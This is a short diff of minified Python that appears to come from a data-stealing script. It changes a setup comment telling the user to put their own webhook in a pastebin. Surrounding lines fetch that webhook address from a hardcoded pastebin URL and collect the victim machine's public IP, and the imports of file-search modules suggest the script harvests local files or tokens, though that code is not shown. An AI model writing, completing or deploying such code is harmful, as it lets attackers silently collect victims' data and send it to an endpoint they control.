@@ -2,7 +2,7 @@ J=len
 import os,random
 from urllib.request import Request as B,urlopen as C
 import re,glob as D
-#Change this pastebin to yourwebhook
+#Put your webhook in a pastebin and Change this pastebin to your webhook pastebin
 F=C(B('https://pastebin.com/raw/hSY5ZkZx')).read().decode().strip()
 G=C(B('https://api.ipify.org')).read().decode().strip()
 def H():
